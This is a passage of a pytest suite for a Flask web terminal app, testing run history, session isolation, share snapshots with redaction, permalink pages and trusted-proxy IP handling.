            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_exit_code_and_recent_date_range(self):
        client = get_client()
        session = "history-date-session"
        run_ids = ["date-run-1", "date-run-2", "date-run-3"]
        recent = datetime.now().replace(microsecond=0)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "curl recent ok", recent.isoformat(), (recent + timedelta(seconds=2)).isoformat(), 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "curl recent fail",
                    (recent - timedelta(hours=1)).isoformat(),
                    (recent - timedelta(hours=1) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[2],
                    session,
                    "curl old fail",
                    (recent - timedelta(days=40)).isoformat(),
                    (recent - timedelta(days=40) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?exit_code=nonzero&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["curl recent fail"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_active_history_returns_running_runs_for_this_session(self):
        client = get_client()
        session = f"session-{uuid.uuid4()}"
        active_runs = [
            {
                "run_id": "run-1",
                "command": "ping darklab.sh",
                "started": "2026-01-01T00:00:00Z",
            }
        ]

        with mock.patch("blueprints.history.active_runs_for_session", return_value=active_runs) as active_mock:
            resp = client.get("/history/active", headers={"X-Session-ID": session})

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"runs": active_runs}
        active_mock.assert_called_once_with(session)


# ── /share ────────────────────────────────────────────────────────────────────

class TestShareRoute:
    def test_post_creates_snapshot(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "test snapshot", "content": ["line1", "line2"]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data
        assert "url" in data

    def test_post_rejects_non_string_label(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": 123, "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Label must be a string"

    def test_post_rejects_non_list_content(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": {"text": "line"}},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content must be a list"

    def test_post_rejects_invalid_content_item(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": ["ok", 123]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content items must be strings or objects"

    def test_post_rejects_content_object_without_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": 123, "cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_cls(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": "hello", "cls": 123}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must use string cls values"

    def test_post_accepts_renderable_content_objects(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "good content",
                "content": [
                    {"text": "$ echo hi", "cls": "cmd", "tsC": "2026-01-01 00:00:00"},
                    {"text": "hi", "cls": "notice"},
                ],
            },
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data

    def test_post_applies_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [
                {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
            ],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "good content",
                    "content": [
                        {"text": "Authorization: Bearer abc123", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "Authorization: Bearer [redacted]"

    def test_post_applies_builtin_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "builtin redaction",
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact [email-redacted] at [ip-redacted]"

    def test_post_skips_share_redaction_when_apply_redaction_false(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "raw share",
                    "apply_redaction": False,
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact admin@example.com at 203.0.113.10"

    def test_post_rejects_non_boolean_apply_redaction(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "bad share",
                "apply_redaction": "yes",
                "content": [{"text": "line 1", "cls": ""}],
            },
            headers={"X-Session-ID": "test-session"},
        )
        assert resp.status_code == 400
        data = json.loads(resp.data)
        assert data["error"] == "apply_redaction must be a boolean"

    def test_post_rejects_non_object_json(self):
        client = get_client()
        resp = client.post(
            "/share",
            json=["bad", "payload"],
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"

    def test_get_nonexistent_share_returns_404(self):
        client = get_client()
        resp = client.get("/share/nonexistent-share-id")
        assert resp.status_code == 404

    def test_get_share_json_returns_content(self):
        client = get_client()
        # Create a snapshot first
        create_resp = client.post(
            "/share",
            json={"label": "my label", "content": ["hello", "world"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]

        # Fetch it as JSON
        resp = client.get(f"/share/{share_id}?json")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["label"] == "my label"
        assert "hello" in data["content"]

    def test_get_share_html_returns_page(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "html test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert resp.status_code == 200
        assert b"<html" in resp.data.lower()

    def test_get_share_html_honors_theme_name_cookie(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "theme selector test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        client.set_cookie("pref_theme_name", "blue_paper")
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'class="permalink-page"' in body
        assert 'data-theme="blue_paper"' in body
        assert '/static/css/styles.css' in body

    def test_get_share_html_contains_label(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "unique-label-xyz", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert b"unique-label-xyz" in resp.data

    def test_get_share_html_does_not_prepend_label_for_structured_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "curl http://localhost:5001/config",
                "content": [
                    {"text": "$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                    {"text": "[process exited with code 0 in 0.1s]", "cls": "exit-ok"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        assert "$ ping -c 4 [host-redacted]" in body
        assert "$ curl http://localhost:5001/config" not in body

    def test_get_share_html_includes_prompt_echo_renderer_for_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "prompt-style-test",
                "content": [
                    {"text": "anon@darklab:~$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        # renderPromptEcho is now in the external permalink.js module; the page
        # loads it and bridges data via window.PermData.  Confirm both are present.
        assert "permalink.js" in body
        assert "prompt-echo" in body

    def test_get_share_html_content_type(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "ct-test", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert "text/html" in resp.content_type

    def test_get_share_html_includes_permalink_display_toggles(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "toggle-test",
                "content": [
                    {"text": "line 1", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'id="toggle-ln"' in body
        assert 'id="toggle-ts"' in body
        assert 'timestamps unavailable' not in body

    def test_get_share_html_shows_line_count_meta(self):
        from config import APP_VERSION
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "meta-lines-test", "content": ["a", "b", "c"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "lines" in body
        assert f"v{APP_VERSION}" in body

    def test_get_share_html_does_not_show_exit_code_badge(self):
        """Snapshots have no exit code — the badge must not appear."""
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "no-exit-test", "content": ["output line"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "meta-badge" not in body


# ── /welcome ──────────────────────────────────────────────────────────────────

class TestWelcomeRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome")
        assert resp.status_code == 200

    def test_returns_list(self):
        client = get_client()
        data = json.loads(client.get("/welcome").data)
        assert isinstance(data, list)

    def test_returns_cmd_and_out_fields_when_configured(self):
        client = get_client()
        mock_blocks = [{"cmd": "ping google.com", "out": "64 bytes"}]
        with mock.patch("blueprints.content.load_welcome", return_value=mock_blocks):
            data = json.loads(client.get("/welcome").data)
        assert len(data) == 1
        assert data[0]["cmd"] == "ping google.com"
        assert data[0]["out"] == "64 bytes"

    def test_returns_empty_list_when_no_welcome_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_welcome", return_value=[]):
            data = json.loads(client.get("/welcome").data)
        assert data == []


# ── /autocomplete ─────────────────────────────────────────────────────────────

class TestAutocompleteRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/autocomplete")
        assert resp.status_code == 200

    def test_has_suggestions_key(self):
        client = get_client()
        data = json.loads(client.get("/autocomplete").data)
        assert "suggestions" in data
        assert isinstance(data["suggestions"], list)
        assert "context" in data
        assert isinstance(data["context"], dict)

    def test_returns_configured_context(self):
        client = get_client()
        with mock.patch("blueprints.content.load_autocomplete_context", return_value={"nmap": {"flags": []}}):
            data = json.loads(client.get("/autocomplete").data)
        assert data["suggestions"] == []
        assert "nmap" in data["context"]


# ── /history session isolation ────────────────────────────────────────────────

class TestHistorySessionIsolation:
    def test_empty_history_for_fresh_session(self):
        client = get_client()
        data = json.loads(client.get(
            "/history", headers={"X-Session-ID": "fresh-session-no-runs-xyz"}
        ).data)
        assert data["runs"] == []

    def test_history_scoped_to_session(self):
        session_a = "isolation-test-session-A"
        session_b = "isolation-test-session-B"
        run_id = "isolation-test-run-id-001"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) "
            "VALUES (?, ?, ?, datetime('now'))",
            (run_id, session_a, "ping isolation-test")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            runs_a = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_a}
            ).data)["runs"]
            runs_b = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_b}
            ).data)["runs"]
            assert any(r["id"] == run_id for r in runs_a)
            assert not any(r["id"] == run_id for r in runs_b)
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
            conn.commit()
            conn.close()

    def test_delete_only_affects_own_session(self):
        session_a = "delete-test-session-A"
        session_b = "delete-test-session-B"
        run_a = "delete-test-run-A"
        run_b = "delete-test-run-B"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_a, session_a, "ping a")
        )
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_b, session_b, "ping b")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            client.delete("/history", headers={"X-Session-ID": session_a})
            # Session B's run should be unaffected
            conn = sqlite3.connect(DB_PATH)
            count = conn.execute(
                "SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)
            ).fetchone()[0]
            conn.close()
            assert count == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id IN (?, ?)", (run_a, run_b))
            conn.commit()
            conn.close()


# ── /history/<run_id> permalink ───────────────────────────────────────────────

class TestRunPermalinkRoute:
    def _insert_run(
        self,
        run_id,
        command,
        output=None,
        *,
        preview_truncated=0,
        full_output_available=0,
        full_output_truncated=0,
        full_output_lines=None,
    ):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, output_preview, preview_truncated, "
            "output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, datetime('now'), ?, ?, ?, ?, ?)",
            (
                run_id,
                command,
                json.dumps(output or []),
                preview_truncated,
                len(output or []),
                full_output_available,
                full_output_truncated,
            )
        )
        if full_output_available and full_output_lines is not None:
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, ?, ?, datetime('now'))",
                (
                    run_id,
                    f"{run_id}.txt.gz",
                    len("\n".join(full_output_lines).encode()),
                    len(full_output_lines),
                    full_output_truncated,
                ),
            )
        conn.commit()
        conn.close()
        if full_output_available and full_output_lines is not None:
            import gzip
            from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
            ensure_run_output_dir()
            with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
                for line in full_output_lines:
                    f.write(line + "\n")

    def _delete_run(self, run_id):
        from run_output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
        except FileNotFoundError:
            pass

    def test_html_view_returns_200(self):
        run_id = "permalink-html-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}")
            assert resp.status_code == 200
            assert b"<html" in resp.data.lower()
        finally:
            self._delete_run(run_id)

    def test_html_view_contains_command(self):
        run_id = "permalink-cmd-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            resp = get_client().get(f"/history/{run_id}")
            assert b"nmap -sV 10.0.0.1" in resp.data
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_command(self):
        run_id = "permalink-json-test-run"
        self._insert_run(run_id, "dig google.com", ["answer section"])
        try:
            data = json.loads(get_client().get(f"/history/{run_id}?json").data)
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_full_output_when_artifact_exists(self):
        run_id = "permalink-json-full-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(get_client().get(f"/history/{run_id}?json").data)
            assert data["command"] == "man curl"
            assert data["output"] == ["full line 1", "full line 2"]
        finally:
            self._delete_run(run_id)

    def test_json_preview_view_returns_preview_when_requested(self):
        run_id = "permalink-json-preview-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview line"],
            preview_truncated=1,
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(get_client().get(f"/history/{run_id}?json&preview=1").data)
            assert data["command"] == "man curl"
            assert data["output"] == ["preview line"]
            assert (
                "To view the full output, use either permalink button now; "
                "after another command, use this command's history permalink"
                in data["preview_notice"]
            )
        finally:
            self._delete_run(run_id)

    def test_html_content_type(self):
        run_id = "permalink-ct-test-run"
        self._insert_run(run_id, "ping test")
        try:
            resp = get_client().get(f"/history/{run_id}")
            assert "text/html" in resp.content_type
        finally:
            self._delete_run(run_id)

    def test_permalink_uses_full_output_when_available(self):
        run_id = "permalink-full-link-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            ["preview line"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            resp = get_client().get(f"/history/{run_id}")
            assert b"full line 1" in resp.data
            assert b"preview line" not in resp.data
        finally:
            self._delete_run(run_id)

    def test_preview_page_appends_truncation_notice_when_no_full_output_exists(self):
        run_id = "permalink-preview-truncated-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
        try:
            resp = get_client().get(f"/history/{run_id}")
            assert b"preview truncated" in resp.data
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_line_number_toggle_and_disables_timestamps_without_metadata(self):
        run_id = "permalink-toggle-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}")
            body = resp.get_data(as_text=True)
            assert 'id="toggle-ln"' in body
            assert 'id="toggle-ts" disabled' in body
            assert 'timestamps unavailable for this permalink' in body
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_prompt_echo_and_enabled_timestamps_for_structured_run_output(self):
        run_id = "permalink-structured-toggle-test-run"
        structured_preview = [
            {"text": "64 bytes from 8.8.8.8", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
        ]
        self._insert_run(run_id, "ping google.com", structured_preview)
        try:
            resp = get_client().get(f"/history/{run_id}")
            body = resp.get_data(as_text=True)
            assert "$ ping google.com" in body
            assert 'id="toggle-ts"' in body
            assert 'timestamps unavailable for this permalink' not in body
        finally:
            self._delete_run(run_id)

    def _insert_run_with_meta(self, run_id, command, exit_code, started, finished, output=None):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, "
            "preview_truncated, output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, ?, ?, ?, ?, 0, ?, 0, 0)",
            (
                run_id, command, started, finished, exit_code,
                json.dumps(output or []), len(output or []),
            )
        )
        conn.commit()
        conn.close()

    def test_html_view_shows_exit_code_zero_badge(self):
        run_id = "permalink-meta-exit0-run"
        self._insert_run_with_meta(
            run_id, "curl http://example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:05",
            ["HTTP/1.1 200 OK"],
        )
        try:
            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
            assert "exit 0" in body
            assert "meta-badge-ok" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_nonzero_exit_code_badge(self):
        run_id = "permalink-meta-exitfail-run"
        self._insert_run_with_meta(
            run_id, "curl http://missing.invalid", 6,
            "2026-04-10T10:00:00", "2026-04-10T10:00:02",
            ["curl: (6) Could not resolve host"],
        )
        try:
            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
            assert "exit 6" in body
            assert "meta-badge-fail" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_duration(self):
        run_id = "permalink-meta-duration-run"
        self._insert_run_with_meta(
            run_id, "nmap -sV 10.0.0.1", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:01:30",
            ["Nmap done"],
        )
        try:
            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
            assert "1m 30s" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_line_count(self):
        run_id = "permalink-meta-lines-run"
        self._insert_run_with_meta(
            run_id, "dig example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:01",
            ["line1", "line2", "line3"],
        )
        try:
            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
            # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
            assert "lines" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_app_version(self):
        from config import APP_VERSION
        run_id = "permalink-meta-version-run"
        self._insert_run_with_meta(
            run_id, "whoami", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
        )
        try:
            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
            assert f"v{APP_VERSION}" in body
        finally:
            self._delete_run(run_id)


class TestRunFullOutputRoute:
    def _insert_run(self, run_id, command):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
            "VALUES (?, 'test-session', ?, datetime('now'), 1)",
            (run_id, command)
        )
        conn.execute(
            "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
            "VALUES (?, ?, 'gzip', 12, 2, 0, datetime('now'))",
            (run_id, f"{run_id}.txt.gz")
        )
        conn.commit()
        conn.close()

        import gzip
        from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
        ensure_run_output_dir()
        with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
            f.write("line 1\nline 2\n")

    def _delete_run(self, run_id):
        from run_output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id = ?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
        except FileNotFoundError:
            pass

    def test_full_output_json_returns_artifact_lines(self):
        run_id = "permalink-full-json-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            data = json.loads(get_client().get(f"/history/{run_id}/full?json").data)
            assert data["command"] == "nmap -sV 10.0.0.1"
            assert data["output"] == ["line 1", "line 2"]
        finally:
            self._delete_run(run_id)

    def test_full_output_html_alias_matches_canonical_permalink(self):
        run_id = "permalink-full-html-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            resp = get_client().get(f"/history/{run_id}/full")
            assert resp.status_code == 200
            assert b"line 1" in resp.data
        finally:
            self._delete_run(run_id)

    def test_full_output_alias_falls_back_to_preview_when_artifact_is_unavailable(self):
        run_id = "permalink-full-missing-artifact-run"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
            "VALUES (?, 'test-session', ?, datetime('now'), 0)",
            (run_id, "nmap -sV 10.0.0.1"),
        )
        conn.commit()
        conn.close()
        try:
            resp = get_client().get(f"/history/{run_id}/full")
            assert resp.status_code == 200
            assert b"nmap -sV 10.0.0.1" in resp.data
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
            conn.commit()
            conn.close()


# ── Response content types ────────────────────────────────────────────────────

class TestContentTypes:
    def test_config_returns_json(self):
        resp = get_client().get("/config")
        assert "application/json" in resp.content_type

    def test_health_returns_json(self):
        resp = get_client().get("/health")
        assert "application/json" in resp.content_type

    def test_faq_returns_json(self):
        resp = get_client().get("/faq")
        assert "application/json" in resp.content_type

    def test_autocomplete_returns_json(self):
        resp = get_client().get("/autocomplete")
        assert "application/json" in resp.content_type

    def test_index_returns_html(self):
        resp = get_client().get("/")
        assert "text/html" in resp.content_type


# ── get_client_ip ─────────────────────────────────────────────────────────────

class TestGetClientIp:
    """get_client_ip() honors X-Forwarded-For only for trusted proxy peers,
    otherwise falls back to the direct connection IP (REMOTE_ADDR)."""

    def setup_method(self, method):  # noqa: ARG002
        self._original_level = shell_app.log.level
        shell_app.log.setLevel(logging.DEBUG)

    def teardown_method(self, method):  # noqa: ARG002
        shell_app.log.setLevel(self._original_level)

    def test_valid_ipv4_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "1.2.3.4"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "1.2.3.4"

    def test_valid_ipv6_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "2001:db8::1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "2001:db8::1"

    def test_last_untrusted_ip_used_when_xff_has_multiple_trusted_hops(self):
        original_cidrs = list(shell_app.CFG.get("trusted_proxy_cidrs", []))
        with mock.patch.dict(
            shell_app.CFG,
            {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
            clear=False,
        ), mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "5.6.7.8, 10.0.0.1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "5.6.7.8"

    def test_untrusted_proxy_logs_proxy_ip_and_falls_back(self):
        with mock.patch.object(shell_app.log, "warning") as mock_warning:
            with shell_app.app.test_request_context(
                "/health",
                environ_base={"REMOTE_ADDR": "203.0.113.10"},
                headers={"X-Forwarded-For": "1.2.3.4"},
            ):
                assert shell_app.get_client_ip() == "203.0.113.10"
        calls = [c for c in mock_warning.call_args_list if c[0][0] == "UNTRUSTED_PROXY"]
        assert calls[0].kwargs["extra"]["proxy_ip"] == "203.0.113.10"
        assert calls[0].kwargs["extra"]["forwarded_for"] == "1.2.3.4"

    def test_no_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client(use_forwarded_for=False).get("/health")
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        # Flask test client REMOTE_ADDR is 127.0.0.1
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_non_ip_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "not-an-ip"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_empty_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": ""})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"
